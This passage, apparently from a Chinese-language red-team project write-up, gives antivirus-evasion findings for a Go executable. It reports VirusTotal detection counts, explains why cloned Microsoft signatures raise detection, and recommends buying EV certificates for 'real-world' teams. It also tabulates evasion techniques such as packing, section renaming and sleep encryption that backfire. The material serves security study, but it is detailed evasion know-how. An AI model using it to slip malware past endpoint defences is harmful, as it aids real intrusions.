| fish_signed.exe（Microsoft 克隆签名） | **6/69** | 反而多 1 个 SentinelOne 检测 |

**签名克隆反而增加了检出**。VT 将克隆的签名标记为 `invalid-signature`，ML 模型检测到"伪造签名"这个特征后反而更加怀疑。

### 13.2 有效签名为什么不实现

有效的 Authenticode 代码签名证书需要：

| 条件 | 说明 |
|------|------|
| **购买证书** | EV 代码签名证书 $200-400/年，需企业身份验证 |
| **密钥管理** | 私钥泄露=任何人都能签恶意软件 |
| **身份暴露** | 证书绑定真实公司名，蓝队可直接溯源 |
| **吊销风险** | 一旦被标记恶意，整个证书被吊销 |

**本项目是学习研究用途，不进行实际攻击部署**，因此：

1. 不购买代码签名证书（成本高、身份暴露风险）
2. 签名克隆实验证明无效签名比无签名更差
3. 5/70 的检出率对学习项目已足够

如果实战团队需要进一步免杀，购买 EV 代码签名证书并正确使用（不是克隆）是降低 ML 检出的最有效手段之一。

| 构建配置 | 检出 | 主要检出引擎 |
|---------|------|-------------|

## 十五、免杀反模式

在实际测试中发现了一些**适得其反**的免杀方法：

| 方法 | 问题 | VT检出增量 |
|------|------|---------|
| garble `-tiny` | Go 1.25 `nosplit stack overflow` 运行时崩溃 | 程序无法运行 |
| 修改 PE section 名为随机字符串 | 触发 Microsoft ML 标记 `Wacatac.B!ml` | +1 |
| UPX/MPRESS 压缩 | 多个引擎标记为"packed malware" | +5 |
| 注入高熵代码混淆 | 提升 `.text` 段熵值，触发熵异常检测 | +2 |
| 加密 `.text` 段 (EkkoSleep) | Timer Queue 回调无法执行加密代码 | 程序崩溃 |
| 克隆无效 Authenticode 签名 | ML 模型检测到"伪造签名"特征 | +1 |

**核心原则**：免杀不是"越复杂越好"，而是"越干净越好"。一个没有可疑特征的标准 PE 文件，比经过大量修改的异常 PE 更容易通过检测。
